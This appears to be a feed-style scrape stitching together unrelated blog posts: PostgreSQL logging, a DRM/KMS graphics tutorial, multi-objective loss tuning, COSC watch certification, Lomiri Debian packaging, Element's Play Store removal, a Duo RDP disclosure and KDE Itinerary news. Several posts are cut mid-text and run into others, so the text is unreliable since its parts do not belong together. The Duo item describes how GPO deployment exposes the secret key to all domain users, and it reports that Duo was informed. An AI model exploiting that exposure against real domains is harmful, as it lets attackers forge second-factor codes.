<figure><pre><code data-lang="text">2021-01-30 10:23:33.201 UTC [63]     LOG:  automatic vacuum of table "postgres.public.t": index scans: 0
        pages: 0 removed, 95 remain, 0 skipped due to pins, 0 skipped frozen
        tuples: 8991 removed, 10000 remain, 0 are dead but not yet removable, oldest xmin: 492
        buffer usage: 215 hits, 4 misses, 4 dirtied
        avg read rate: 1.885 MB/s, avg write rate: 1.885 MB/s
        system usage: CPU: user: 0.01 s, system: 0.00 s, elapsed: 0.01 s
        WAL usage: 244 records, 1 full page images, 67984 bytes
2021-01-30 10:23:33.222 UTC [63]     LOG:  automatic analyze of table "postgres.public.t" system usage: CPU: user: 0.01 s, system: 0.00 s, elapsed: 0.01 s</code></pre></figure>

<p>Note that autovacuum will typically trigger an analyze after the vacuum, and
this will also be logged.</p>

<p>These logs will help you figure out how best to tune the autovacuum parameters,
and will help in investigating if and when autovacuum is not being as effective
as you thought it would be.</p>

<h3 id="logging-checkpoints">Logging Checkpoints</h3>

<p>Checkpointing is the process of pushing WAL-logged changes into the actual files
that back tables. Ideally checkpoints should occur at regular-and-not-too-frequent
intervals, as it is a CPU and disk intensive process. For various reasons,
checkpoints are also forced to happen before the next scheduled time, and this
results in reduced query performance.</p>

<p>To keep an eye on checkpoint frequency and efficiency, enable logging of
checkpoints:</p>

<figure><pre><code data-lang="ini"><span>log_checkpoints</span> <span>=</span> <span>on</span></code></pre></figure>

<p>This tells PostgreSQL to log the following whenever a checkpoint occurs:</p>

<figure><pre><code data-lang="text">2021-01-30 10:05:57.085 UTC [56]     LOG:  checkpoint starting: immediate force wait
2021-01-30 10:05:57.159 UTC [56]     LOG:  checkpoint complete: wrote 0 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.000 s, sync=0.000 s, total=0.074 s; sync files=0, longest=0.000 s, average=0.000 s; distance=0 kB, estimate=0 kB</code></pre></figure>

<p>The first line contains the flags that backend passed to the checkpointer. You
can see that the “force” caused a checkpoint even though there were no pending
changes to checkpoint. If “immediate” had not been specified, the checkpointer
would have checkpointed up to <em>checkpoint_completion_target</em>.</p>

<h3 id="other-server-side-settings">Other Server-Side Settings</h3>

<p>There are a couple of other settings that you can turn on in your PostgreSQL
configuration that will help with diagnosing issues:</p>

<ul>
  <li><em>track_io_timing</em> - setting this to <em>on</em> lets you see the time spent in
disk I/O for each query (combined with pg_stat_statements extension
described below). See <a href="https://www.postgresql.org/docs/current/runtime-config-statistics.html#GUC-TRACK-IO-TIMING">the docs</a>
about a caveat to turning this on, but should be safe on nearly any modern
Linux. Seeing a query’s disk I/O cost is impossible without turning this on.</li>
  <li><em>track_commit_timestamp</em> - setting this to <em>on</em> can be useful in debugging
replication lags and other replication-related …</li></ul></div></div></div></div>

January 30, 2021 | https://felipetavares.com/post/learning-userland-drm-part-ii/ | <a href="https://web.archive.org/web/*/https://felipetavares.com/post/learning-userland-drm-part-ii/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>In the <a href="https://felipetavares.com/post/learning-userland-drm-part-i/">previous post</a> in this series, we talked about how user
applications can use the system call <code>ioctl()</code> after opening a file that’s
usually called <code>/dev/dri/card0</code> to drive the graphics card and draw things on
the screen.</p>
<p>We did not yet draw anything on the screen, we only talked to the driver and got
some information on the current version:</p>
<pre><code>❯ ./drm-part-1
i915
Intel Graphics
1.6.0
</code></pre>

<p>From now on we will have to use intel specific commands since we have an intel
card, so unfortunatly almost nothing from here applies to other cards, except
the general concepts - which are actually very important: you can easily learn
specifics if you know how the whole thing is supposed to work.</p>

<p>First thing, lets include <code>string.h</code> because it is useful for memory
manipulation, which we will need when we start sending images and other kinds of
buffers (commands, mainly) to the graphics card.</p>
<p>And now lets include the actual header files for <code>libdrm</code> for some quality of
live improvements versus directly sending structs to the kernel using <code>ioctl()</code>.
And while we are at it, lets include the libraries specific to intel cards and
our intel driver too.</p>
<div><pre><code data-lang="cpp"><span>// libdrm
</span><span></span><span>#include</span> <span>&lt;xf86drm.h&gt;</span><span>
</span><span>#include</span> <span>&lt;xf86drmMode.h&gt;</span><span>
</span><span></span><span>// intel-specific memory management &amp; commands
</span><span></span><span>#include</span> <span>&lt;libdrm/intel_bufmgr.h&gt;</span><span>
</span><span>#include</span> <span>&lt;libdrm/i915_drm.h&gt;</span><span>
</span></code></pre></div><p>Now lets create the same functionality as we did previously but using the
higher-level <em>libdrm</em> functions! But first, lets update our <code>print_version()</code>
definition:</p>
<div><pre><code data-lang="cpp"><span>void</span> <span>print_version</span>(<span>const</span> drmVersionPtr version) {
    std<span>::</span>cout <span>&lt;&lt;</span> std<span>::</span>string(version<span>-&gt;</span>name, version<span>-&gt;</span>name_len) <span>&lt;&lt;</span> std<span>::</span>endl
              <span>&lt;&lt;</span> std<span>::</span>string(version<span>-&gt;</span>desc, version<span>-&gt;</span>desc_len) <span>&lt;&lt;</span> std<span>::</span>endl
              <span>&lt;&lt;</span> version<span>-&gt;</span>version_major <span>&lt;&lt;</span> <span>"."</span>
              <span>&lt;&lt;</span> version<span>-&gt;</span>version_minor <span>&lt;&lt;</span> <span>"."</span>
              <span>&lt;&lt;</span> version<span>-&gt;</span>version_patchlevel <span>&lt;&lt;</span> std<span>::</span>endl;
}
</code></pre></div><p>the only difference is that now we are taking a <code>drmVersionPtr</code> in instead of a
<code>drm_version_t&amp;</code>, which also implies converting <code>.</code> acessors to <code>-&gt;</code> ones.</p>
<p>And now lets create the function which will do the same thing as we were doing,
<code>fetch_and_print_driver_version</code>:</p>
<div><pre><code data-lang="cpp"><span>void</span> <span>fetch_and_print_driver_version</span>(<span>const</span> <span>int</span> gpu) {
    <span>// Let libdrm handle the ioctl()s
</span><span></span>    drmVersionPtr version <span>=</span> drmGetVersion(gpu);
    drmVersionPtr lib_version <span>=</span> drmGetLibVersion(gpu);

    std<span>::</span>cout <span>&lt;&lt;</span> <span>"Driver:"</span> <span>&lt;&lt;</span> std<span>::</span>endl;
    print_version(version);
    std<span>::</span>cout <span>&lt;&lt;</span> <span>"Lib:"</span> <span>&lt;&lt;</span> std<span>::</span>endl;
    print_version(lib_version);

    <span>// Free memory
</span><span></span>    drmFreeVersion(version);
    drmFreeVersion(lib_version);
}
</code></pre></div>
<p>Now we are going to jump into new territory. We are going to set the mode that
the graphics card will opperate in, which is essentially setting the screen
resolution. We also have a new way of opening the graphics card file:</p>
<div><pre><code data-lang="cpp"><span>// There is a drmOpenMinor function in libdrm for which no Bus ID is needed
</span><span>// but it is not exposed :/
</span><span></span><span>const</span> <span>int</span> gpu <span>=</span> drmOpen(<span>nullptr</span>, <span>"pci:0000:00:02.0"</span>);
</code></pre></div><p>for that we need the <strong>Bus ID</strong>, which we can find with <code>lspci</code> in the shell:</p>
<pre><code>❯ lspci
...
00:02.0 VGA compatible controller: Intel Corporation Skylake GT2 [HD Graphics 520] (rev 07)
...
</code></pre>
<p>or we can also find in the <code>journalctl</code> logs the part where the kernel detects the
graphics card:</p>
<pre><code>❯ journalctl -k -b 0 | grep VGA
Jan 24 18:47:37 corona kernel: pci 0000:00:02.0: vgaarb: setting as boot VGA device
...
</code></pre>
<p>After opening the file, we also need to initialize the intel memory manager,
which will manage buffers in the graphics card for us.</p>
<div><pre><code data-lang="cpp"><span>auto</span> bufmgr <span>=</span> drm_intel_bufmgr_gem_init(gpu, <span>32</span>);
</code></pre></div>
<p>KMS, or Kernel Mode Setting is, as mentioned above, more or less setting the
screen resolution. In reality we are setting a <em>mode</em>, which is not just the
screen resolution, but all other related configurations in the card: bit depth,
margins etc.</p>
<p>There are four main structures involved in <em>KMS</em>: <strong>resources</strong>, <strong>connectors</strong>,
<strong>encoders</strong> and <strong>crtcs</strong>.</p>
<p><img src="https://felipetavares.com/img/kms-structures.png" alt="resources → connectors → encoders → crtcs"></p>
<p>What actually does the “mode setting” and sets the display configurations is
setting the <em>Cathode Ray Tube Controller</em> (CRTC, I know, this should be
refactored at this point…) mode with <code>drmModeSetCrtc()</code> but to get it we need
to get the resources, connectors and encoders to finally find our CRTC.</p>
<div><pre><code data-lang="cpp"><span>// Get the resources
</span><span></span><span>const</span> drmModeResPtr res <span>=</span> drmModeGetResources(gpu);

<span>// Get each connector -&gt; encoder -&gt; crtc

In fact, they are commonly used as the standard approach, despite that they are a perilous area full of dicey pitfalls. Especially regarding how these linear combinations make your algorithm hard to tune.</p><p>Therefore, in this post we hope to lay out the following arguments:</p><ul><li>A lot of problems in machine learning should be treated as multi-objective problems, while they currently are not.</li><li>This lack of multi-objective treatment leads to difficulties in tuning the hyper-parameters for these machine learning algorithms.</li><li>It is nigh on impossible to detect when these problems are occurring, making it tricky to work around them.</li><li>There are methods to solve this which might be slightly involved, but do not require more than a few lines of code. <a href="https://engraved.ghost.io/how-we-can-make-machine-learning-algorithms-tunable">One of these methods is laid out in a follow-up blog post.</a></li></ul><p>Nothing of this article is novel. You might already be aware of everything we wanted to say. However, we have the impression that most machine learning curricula do not discuss optimisation methods very well (I know mine did not), and consequently, gradient descent is being treated as the one method to solve all problems. And the general message is that if an algorithm does not work for your problem, you need to spend more time tuning the hyper-parameters to your problem. </p><p><a href="https://engraved.ghost.io/how-we-can-make-machine-learning-algorithms-tunable">In the next blog post, a solution is introduced</a>, based on the NIPS’88 paper which introduced the Modified Differential Method of Multipliers.</p><p>So we hope that this blogpost can remove some confusion on how to handle this issue in a more foundational and principled way. And hey, maybe it can make you spend less time tuning your algorithms, and more time making research progress.</p><h2 id="linear-combinations-of-losses-are-everywhere">Linear combinations of losses are everywhere</h2><p>While there are single-objective problems, it is common for these objectives to be given additional regularisation. We have picked a selection of such optimisation objectives from across the field of machine learning field.</p><p>First off, we have the regularisers, weight decay and lasso. It is obvious that when you add these regularisations, you effectively have created a multi-objective loss for your problem. After all, what you really care about, is that both the original loss \(L_0\) and the regulariser loss are kept low. And you will tune the balance between the two using a \(\lambda\) parameter.</p><p>$$ L(\theta) = L_0(\theta) + \lambda \sum \left| \theta \right| $$</p><p>$$ L(\theta) = L_0(\theta) + \lambda \sum \theta^2 $$</p><p>As a consequence, losses found in e.g. VAE’s are effectively multi-objective, with a first objective to maximally cover the data, and a second objective to stay close to the prior distribution. In this case, occasionally KL annealing is used to introduce a tunable parameter \(\beta\) to help handle the multi-objectiveness of this loss.</p><p>$$ L(\theta) =\mathbb{E}_{q_{\phi}(z | x )} \left[ \log p_\theta ( x | z) \right] &nbsp;- \beta D_{KL} \left( q_\phi ( z | x) \| p(z) \right) $$</p><p>Also in reinforcement learning, you can see this multi-objectiveness. Not only is it common for many environments to simply sum rewards received for obtaining partial goals. The policy loss is usually also a linear combination of losses. Take as an example here the losses on the policy for PPO, SAC and MPO, entropy regularized methods with their tunable parameter <strong><em>α</em></strong>.</p><p>$$ L(\pi) = - \sum_t \mathbb{E}_{(s_t, a_t)} \left[ r(s_t, a_t) + \alpha \mathcal{H}(\cdot , s_t)\right]$$</p><p>$$ L(\pi) = - \sum_t \mathbb{E}_{(s_t, a_t)} \left[ \mathbb{E}_\pi\left(Q(s_t, a_t)\right) - \alpha D_{KL} \left( q \| \pi \right) \right]$$</p><p>Finally, the GAN-loss is of course a sum between the discriminator and the generator loss:</p><p>$$ L(\theta) = - \mathbb{E}_x \left[ \log D_\theta(x)\right] - \mathbb{E}_z \left[ \log ( 1- D_\theta(G_\theta(z))\right]$$</p><p>All of these losses have something in common, they are effectively trying to optimise for multiple objectives simultaneously, and argue that the optimum is found in balancing these often contradicting forces. In some cases, the sum is more ad hoc and a hyper-parameter is introduced to weigh the parts against each other. In some cases, there are clear theoretical foundations on why the losses are combined this way, and no hyper-parameter is used for tuning the balance between the parts. </p><blockquote>In this post, we hope to show you this approach of combining losses may sound appealing, but that this linear combination is actually precarious and treacherous. The balancing act is often more like a tightrope walk.</blockquote><p>Let us consider a simple case, where we are trying to optimise for such a linear combination of losses. We take the approach of optimising the total loss, which is a sum of losses. We optimise this with gradient descent, and we observe the following behaviour.</p><figure><img src="https://lh5.googleusercontent.com/953U2daXgDAO_97ugiYVEKnbK69gZVKUmlY9hNpCqtYlTso-XFw8WQ-dWRcBNeNtx7KNvXi1bM5mB8cfmnjXUMg4gU6fp5LvADys1WtoWIW-mqiJt1Uzu-Lw8VceNfQeLLQa9IZa" alt=""></figure><p>Our code in Jax would look something like this:</p><pre><code>def loss(θ):
  return loss_1(θ) + loss_2(θ)
loss_derivative = grad(loss)
for gradient_step in range(200):
  gradient = loss_derivative(θ)
  θ = θ - 0.02 * gradient</code></pre><p>As is usually the case, we are not immediately happy about the tradeoff between the two losses. So we introduce a scaling coefficient <strong><em>α</em></strong> on the second loss and run the following code:</p><pre><code>def loss(θ, α):
  return loss_1(θ) + α*loss_2(θ)
loss_derivative = grad(loss)
for gradient_step in range(200):
  gradient = loss_derivative(θ, α=0.5)
  θ = θ - 0.02 * gradient
</code></pre><p>The behaviour we hope to see is that when tuning this <strong><em>α</em></strong>, we can choose the trade-off between the two losses and select the point we are most happy with for our application. We effectively will go on a hyper-parameter tuning loop, manually select an <strong><em>α</em></strong>, run the optimisation process, decide we would like the second loss to be lower, tune our <strong><em>α</em></strong> up accordingly and repeat the whole optimisation process. After several iterations, we settle for the solution we found and continue writing our papers.</p><p>However, that is not what is always happening. The actual behaviour we sometimes observe for our problem looks like the one below.</p><figure><img src="https://lh6.googleusercontent.com/iZlk4MRVx7JYgLbaqIv-jH8zZGSc78Jj-aqk_YWy5e80tf_hgMMaBn41yRFR2rpRFGE8vuRGWjljGZ6Ri8XbyDhZbAQbSCX-putykGEpxgmcuPTmrQH1VHKpaKfjra3AG4u-x9K7" alt=""></figure><blockquote>It seems that no matter how we finetune our <strong><em>α</em></strong>-parameter, we cannot make a good trade-off between our two losses. </blockquote><p>We see two clusters of solutions, one where the first loss is ignored, and one where the second loss is ignored. However, both of these solutions are not useful for most applications. Most of the time, a point where the two losses were more balanced is a more preferred solution.</p><p>In fact, this diagram of the two losses over the course of training is barely ever plotted, so the dynamics illustrated in this figure often goes unobserved. We just look at the training curve plotting the total loss, and we might conclude that this hyper-parameter needs more time tuning, as it seems to be really sensitive. Alternatively, we could settle for an approach of early stopping to make the numbers in the paper work. After all, reviewers love data efficiency.</p><p>Where did it go wrong though? <strong>Why does this method sometimes work, and why does it sometimes fail to give you a tunable parameter?</strong> For that, we need to look deeper into the difference between the two figures.</p><p>Both figures are generated for the same problem, using the same losses and are optimising these losses using the same optimisation method. So none of these aspects are to blame for the difference. The thing which has changed between these problems is the model. In other words, the effect the model parameters <strong><em>θ</em></strong> have on the output of the model is different.</p><p>Therefore, let us <em>cheat</em> and visualise something which is normally not visualisable, the Pareto front for both of our optimisations. This is the set of all solutions achievable by our model, which are not dominated by any other solution. In other words, it is the set of achievable losses, where there is no point where <em>all</em> of the losses are better. No matter how you choose to trade off between the two losses, your preferred solution always lies on the Pareto front. By tuning the hyper-parameter of your loss, you usually hope to merely find a different point on that same front.</p><figure><img src="https://lh6.googleusercontent.com/6qA_NcRMUK8mWT3j3-t_bPl-oZkwg5Q9lWcOgBn9IB3qF_yQ7p1dyH6eq_DtKpTGeACMsLE-YfiIY9DH3yhF7swsmMFGMjNwI_oHdKKbNTuO0M8a_oDZQTUhKGcEuAfTpomqHX-M" alt=""></figure><figure><img src="https://lh6.googleusercontent.com/kVqsudO8-j48MEsdlaZgDgc22jMO9myzwdbTTWQ-KufWjuXqIr9gNHKrgV-fRzTb5gMgDnO-sFp1z_lS3UhX3wjwXHRowiaO7Vp04ZaYEAthw7y6wyN3zltH3o0wgB5ZbTDjRuRb" alt=""></figure><p>The difference between the two Pareto fronts is what is causing the tuning to turn out well for the first case, but to fail horribly after changing our model. It turns out that when the Pareto front is convex, we can achieve all possible trade-offs by tuning our <strong><em>α</em></strong>-parameter. However, when the Pareto front is concave, that approach does not seem to work well anymore.</p><h2 id="why-does-gradient-descent-optimisation-fail-for-concave-pareto-fronts">Why does gradient descent optimisation fail for concave Pareto fronts?</h2><p>We can illustrate why that is the case, by looking at the total loss in the third dimension, the loss which is actually optimised with gradient descent. In the following figure, we visualise the plane of total loss in relation to each of the losses. While we actually descend on this plane using the gradient with respect to the parameters, each gradient descent step we take will also necessarily go downwards on this plane. You can imagine the gradient descent optimisation process as putting a spherical pebble on that plane, letting it wobble down under gravity and wait until it comes to a halt.</p><p>The point where the optimisation process halts is the result of the optimisation process, here indicated by a star. As you can see in the following figure, no matter how you wobble down the plane, you will always end up in the optimum.</p><figure><img src="https://lh4.googleusercontent.com/U43_rJCiufKMSZ4gtci5kTQ2DRIH_r8WyvFi0aFV0wjpxXTNSFnMzR8a9DHvBc_ONbi0rEIBfXRQXUSxAcriZDGBNWVRhMQ-ifaIXdgeNf1K6cEIeXzMjYZUk94EWMH_bOBzvhOa" alt=""></figure><p>By tuning <strong><em>α</em></strong>, this space stays a plane. After all, by changing <strong><em>α</em></strong>, we are only changing the tilt of this plane. As you can see, &nbsp;in the convex case any solution on the Pareto curve can be achieved by tuning <strong><em>α</em></strong>. A little more <strong><em>α</em></strong> pulls the star to the left, a little less <strong><em>α</em></strong> pushes the star to the right. Every starting point of the optimisation process will converge on the same solution, and that is true for all values of <strong><em>α</em></strong>.</p><figure><img src="https://engraved.ghost.io/content/images/2021/01/visualising_the_convex_case.mp4.hq.gif" alt=""></figure><p>However, if we take a look at the differently modeled problem with a concave Pareto front, it becomes apparent where …</p></div></section></div></div></div>

            <h3>      Reliability
</h3>
            <p>The official laboratories (OL) of the COSC verify some 1.8 million mechanical and quartz timekeeping instruments annually. The COSC is now the only organisation in the world able to handle such a volume of pieces. Each certified chronometer is unique, identified by a number engraved on its movement and a certificate number issued by the COSC.</p>

            <h3>      The creation of the COSC
</h3>
            <p>Founded in 1973 and based in La Chaux-de-Fonds, the Official Swiss Chronometer Testing Institute (COSC) is a not-for-profit organisation recognised as serving the public interest, dedicated to Swiss watchmaking. Created by five watchmaking cantons (Bern, Geneva, Neuchâtel, Soleure and Vaud), as well as by the Federation of the Swiss Watch Industry (FH), it brings together a number of laboratories that were originally founded as independent institutions in the late 19th century.</p>

<p>Its principal aim is to measure and verify the precision of the watch movements and finished watches entrusted to it by manufacturers, in order to award them the official certified chronometer title.</p>
<p>The COSC’s human resources and the capabilities of its various premises enable the organisation to respond to all requests from the Swiss watch industry in terms of certification and chronometric controls.</p>
<p>The certified "chronometer” title, certifying the high level of precision and uniqueness of timekeeping instruments, is a guarantee of extreme quality, as well as the know-how applied throughout the production process. In the marketplace, it offers added value that enables beneficiaries to stand out from their competitors.</p>

<p>The COSC tests are carried out with absolute rigour:</p>
<ul><li>The chronometric certification of wristwatches with a balance spring is based on 7 criteria set by the ISO 3159 standard, all of which must be fully met.</li>
<li>The chronometric certification of quartz watches, mechanical pocket watches or mechanical fixed timekeeping devices is based on internal requirements inspired by ISO 3159, but adapted to the specificities of the instruments.</li>
<li>Each piece examined daily for 14 to 20 days, depending on the type of instrument.</li>
<li>The certificate means that ALL the instruments entrusted to us are handled by agents of the COSC, a neutral and independent body.</li>
</ul><p>The figures show a boom in COSC activity, with certifications seeing a significant increase.</p>
<ul><li>200,000 certificates in 1976</li>
<li>1 million in 2000</li>
<li>between 1.6 and 1.8 million in recent years</li>
</ul><p>Proof of the very high value to which the COSC "chronometer" certificate attests: only about 6% of Swiss watches exported have this status. (Source: Federation of the Swiss Watch Industry FH).</p>

<p>Before and during FOSDEM 2020, I agreed with the people (developers, supporters, managers) of the UBports Foundation to package the Unity8 Operating Environment for Debian. Since 27th Feb 2020, Unity8 has now become Lomiri.</p>

<p>Things got delayed a little recently as my main developer contact on the upstream side was on sick leave for a while. Fortunately, he has now fully recovered and work is getting back on track.</p>

<h3>Recent Uploads to Debian related to Lomiri</h3>

<p>Over the past 3 months I worked on the following bits and pieces regarding Lomiri in Debian:</p>

<ul>
<li>Work on DEB package qtmir.</li>
<li>Revisit upstream status of lomiri-ui-toolkit (and remind upstream on open issues to be resolved).</li>
<li>Debug googletest / cmake-extras build failures in qtmir DEB package.</li>
<li>Prepare MR!2 für cmake-extras upstream, upload cmake-extras 1.5-3 to Debian unstable.</li>
<li>Upload qtmir to unstable/NEW, submit patches upstream.</li>
<li>Upload to unstable as NEW: ayatana-indicator-bluetooth.</li>
<li>Upload to unstable: qtmir 0.6.1-2.</li>
<li>Upload to unstable: cmake-extras 1.5-5.</li>
<li>More debugging on googletest / cmake-extras.</li>
<li>Qt5.15 transition in Debian, various uploads.</li>
<li>Upload unstable: cmake-extras 1.5-6.</li>
<li>Debug and fix libqtdbustest / libqtdbusmock failures in Debian.</li>
<li>Get in touch with RAOF (on IRC, from the Mir Team) on possible fixes of Mir FTBFS in Debian (after a Mesa upload).</li>
<li>Upload to unstable: mir 1.8.0+dfsg1-11 (fix FTBFS).</li>
<li>Fix dbus-cpp autopkgtests.</li>
<li>Fix Mir FTBFS after Boost 1.74 transition.</li>
<li>Fix FTBFS in unit tests in lomiri-url-dispatcher.</li>
<li>Drop autopilot dependency from DEB package qtmir.</li>
<li>Heads-Up Meeting with Marius Gripsgard (discussion next steps).</li>
</ul>

<p>The next projects / packages ahead are lomiri-ui-toolkit, integrating changes required for Lomiri into Ayatana Indicators and then moving on with several other, smaller packages.</p>

<h3>Credits</h3>

<p>Many big thanks go to Marius and Dalton for their work on the UBports project and being always available for questions, feedback, etc.</p>

<p>Thanks to Florian Leeber for being my point of contact for topcis regarding my cooperation with the UBports Foundation.</p> </div></div>]]>

      <div><p>Hi all,</p><p>At 2021-01-29 at 21:35 UTC Google suspended Element from the Play Store without warning or notification. &nbsp;We submitted an appeal asking for clarification at 23:18, and at 05:31 received a generic update from the Google Play Policy team citing that the app has been removed due to content which contravenes their terms of use, and asking us to “make the necessary changes to [our] app” and “upload a new app using a new package name and a new app name”.</p><p>As of 11:44 UTC we’ve submitted a detailed appeal to reiterate that Element is a generic chat app for connecting to the global Matrix communication network, just as Chrome is a generic web browser for connecting to the Web - and just as Google does not control the content on the Web, Element does not control the content on Matrix.</p><p>We have also explained that the Matrix servers that we <em>do</em> run as Element (including the default Matrix.org homeserver, which we run on behalf of <a href="https://matrix.org/foundation">The Matrix.org Foundation</a>) have <a href="https://matrix.org/legal/terms-and-conditions#6-play-nice-clauses">strict Terms of Use</a> which we actively enforce. We abhor abuse, and Element is not an app that caters to abusive content.</p><p>In order to enforce our terms of use on the Matrix servers we run as Element, we have a formal Trust and Safety team hired full-time who are dedicated to investigating and tracking abuse reports sent to <a href="https://element.io/cdn-cgi/l/email-protection#e48586919781a4898590968d9cca8b9683"><span data-cfemail="d3b2b1a6a0b693beb2a7a1baabfdbca1b4">[email&nbsp;protected]</span></a> or reported from the app. &nbsp;The team takes appropriate action on a ticket by ticket basis - deactivating abusive accounts and blocking chatrooms from our servers which contravene our terms of use, and building tooling to help enforce the terms of use on the servers we run.</p><p>Managing abuse is an ongoing activity, and <a href="https://sifted.eu/articles/element-whatsapp-exodus/">Matrix is expanding massively at the moment</a>. We are expanding Element’s Trust and Safety team to match that growth, focusing on improving our anti-abuse mechanisms, and we are also constantly expanding the <a href="https://matrix.org/docs/guides/moderation/">moderation tools</a> we provide to the community.</p><p>Meanwhile, we’re also continuing to work on decentralised reputation as a <a href="https://matrix.org/blog/2020/10/19/combating-abuse-in-matrix-without-backdoors/">scalable solution to empower other users to combat abuse</a> for the wider Matrix network - effectively bringing control back to users and empowering communities to remain safe online.</p><p>Element and Matrix are used by the French, German, UK and US governments, <a href="https://matrix.org/blog/2021/01/29/this-week-in-matrix-2021-01-29#dept-of-status-of-matrix-%EF%B8%8F">countless universities</a>, thousands of businesses and millions of people across the world - we can only apologise for the disruption caused by the app disappearing like this.</p><p>We’re currently waiting for an update to Google and will keep this blog post updated as the situation develops. &nbsp;We look forward to resolving the problem and getting the app back in the store shortly.</p><p>-- The Element Team</p><p>Update: reminder that in the interim you can download a (slightly outdated) version of Element Android from F-Droid at <a href="https://f-droid.org/en/packages/im.vector.app/">https://f-droid.org/en/packages/im.vector.app</a>. &nbsp;We're also looking into running our own F-Droid repository going forwards so the most recent build is always available there.</p><p>UPDATE: At 2021-01-30 23:17 UTC we received a call from a VP at Google who apologised for the bad communication from Google and explained the situation, which related to some extremely abusive content which was accessible on the default matrix.org homeserver. &nbsp;Our Trust and Safety team had already identified and acted on this content to enforce the server's terms of use, and so we've explained how Element and Matrix works, established a channel for communication over any future moderation concerns, and expect the app to be restored shortly.</p><p>UPDATE: The app is restored as of 2021-01-31 00:30 UTC. &nbsp;Huge thanks to everyone for your patience and support while we sorted this out, and to the wider Element team who spent their Saturday on this. &nbsp;Thanks also to Google for being transparent and apologetic and the rapid resolution once we'd established contact.</p></div>

<p>DUO RDP login has a convenient deployment mode where you can use GPOs to push out the Integration key, Secret key (SKEY), and API hostname settings. However, if you follow their documentation (as least today 2021-01-29) all authenticated users on the domain will be able to read the SKEY. This could allow attackers to <a href="https://www.bleepingcomputer.com/news/security/us-think-tank-breached-three-times-in-a-row-by-solarwinds-hackers/" target="_blank">generate the 2FA codes themselves</a>.&nbsp;</p><p>All users would be able to access the key through any of the steps below:</p><ul><li><span>Open GPMC<p><a href="https://1.bp.blogspot.com/-infWRYGtfe0/YBStYlgivFI/AAAAAAABRmQ/1fYLxxOtcBUU4NBX_RzUvwomBK8qvQzMwCLcBGAsYHQ/s1778/Untitled.png"><img data-original-height="708" data-original-width="1778" src="https://1.bp.blogspot.com/-infWRYGtfe0/YBStYlgivFI/AAAAAAABRmQ/1fYLxxOtcBUU4NBX_RzUvwomBK8qvQzMwCLcBGAsYHQ/s320/Untitled.png" width="320"></a></p><br></span></li><li>Pull the registry.pol file from the SYSVOL share<p><a href="https://1.bp.blogspot.com/-nLDuFHI2HNc/YBSukeKNRHI/AAAAAAABRmg/tj2T8t-mMOYXQ9bzoew3sXY1VCfvJQz3ACLcBGAsYHQ/s956/2.png"><img data-original-height="295" data-original-width="956" src="https://1.bp.blogspot.com/-nLDuFHI2HNc/YBSukeKNRHI/AAAAAAABRmg/tj2T8t-mMOYXQ9bzoew3sXY1VCfvJQz3ACLcBGAsYHQ/s320/2.png" width="320"></a></p><p><a href="https://1.bp.blogspot.com/-3ZQKGRlVTRQ/YBSuLw5pzkI/AAAAAAABRmY/58ojAPzq9Uw8cexTDwkPD7eyz4tYqPpqwCLcBGAsYHQ/s1468/2.png"><img data-original-height="261" data-original-width="1468" src="https://1.bp.blogspot.com/-3ZQKGRlVTRQ/YBSuLw5pzkI/AAAAAAABRmY/58ojAPzq9Uw8cexTDwkPD7eyz4tYqPpqwCLcBGAsYHQ/s320/2.png" width="320"></a></p></li></ul><p>I informed DUO of this issue and they will be updating their documentation.</p><h2>Remediation:</h2><p>If you intend to keep deploying the DUO settings through GPO then the steps below should keep the SKEY safe(r).

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>The end of your holiday break didn’t slow down work on <a href="https://apps.kde.org/en/itinerary">KDE Itinerary</a>,
so we have a lot of news again since the <a href="https://www.volkerkrause.eu/2020/11/28/kde-itinerary-october-november-2020.html">last summary blog</a>
two month ago!</p>

<h3 id="new-features">New Features</h3>

<p>The most visible new feature is the realtime status for elevators and escalators in the
train station map view. I have <a href="https://www.volkerkrause.eu/2020/12/26/kde-wrapping-up-2020.html">previously written</a>
about why this is useful and <a href="https://accessibility.cloud/">where we get the data from</a>,
and meanwhile this has been fully integrated into the app.</p>

<figure>
  
  <img src="https://www.volkerkrause.eu/assets/posts/73/kde-itinerary-realtime-elevator-status.png" alt="Screenshot of KDE Itinerary's train station map showing working elevators and green and those currently out of service in red.">
  
  <figcaption>KDE Itinerary's train station map showing realtime status information for elevators.</figcaption>
</figure>

<p>Technically this requires that we match external information about elevators/escalators with <a href="https://openstreetmap.org/">OSM</a> data,
not unlike what we already have to do for railway platforms for example. This has the nice side-effect
that it allows us to automatically correct common data issues on the way.</p>

<p>For elevators one such issue is that each floor level has its independent OSM element,
rather than there being one element that spans multiple floors. We now detect that and merge this
into a single elevator element, which makes the floor level navigation in our map view work
in this case as well.</p>

<p>Another new feature in the train station map is its ability to
<a href="https://www.volkerkrause.eu/2020/12/12/kde-itinerary-opening-hours-integration.html">evaluate OSM opening hours expressions</a>.</p>

<figure>
  
  <img src="https://www.volkerkrause.eu/assets/posts/72/kde-itinerary-station-map-opening-hours-details.png" alt="Opening hours information for a selected element on the map presented both in textual and visual form.">
  
  <figcaption>Textual description of the current opening state and visual overview of the current week.</figcaption>
</figure>

<p>With the library for this, <a href="https://commits.kde.org/kopeninghours">KOpeningHours</a>, also being used by the
<a href="https://wiki.openstreetmap.org/wiki/Osmose">Osmose</a> OSM validation tool,
a lot of work has gone into the precision and tolerance of the opening hours parser and evaluator,
all also benefiting the use in KDE Itinerary.</p>

<p>OSM contains about 500k distinct <a href="https://wiki.openstreetmap.org/wiki/Key:opening_hours/specification">opening hours expressions</a>
(about 1.8M total), about 16k of those are rejected as invalid by KOpeningHours (and largely for good reasons),
and another 137k are considered to be not strictly valid but understood thanks
to the improved parser tolerance nevertheless. This results in even values like <code>Du Mardi au Vendredi 11h00-13h30 Le samedi 10h-19h</code>
being interpreted now that are much closer to human language than the technically correct
machine readable form for this (<code>Tu-Fr 11:00-13:30; Sa 10:00-19:00</code>).</p>

<h3 id="infrastructure-work">Infrastructure Work</h3>

<p>The <a href="https://github.com/public-transport/transport-apis">Transport APIs Repository</a> initiative is gaining momentum,
and <a href="https://commits.kde.org/kpublictransport">KPublicTransport</a> has seen a number of changes to consume this data.
The Transport API Repository is a collaboration with a number of other public transport
client implementors to share machine-readable descriptions of the various API endpoints,
their respective protocols and parameters as well as metadata (such as the covered regions).</p>

<p>KPublicTransport (and thus its consumers Itinerary and KTrip) will directly benefit from this by sharing
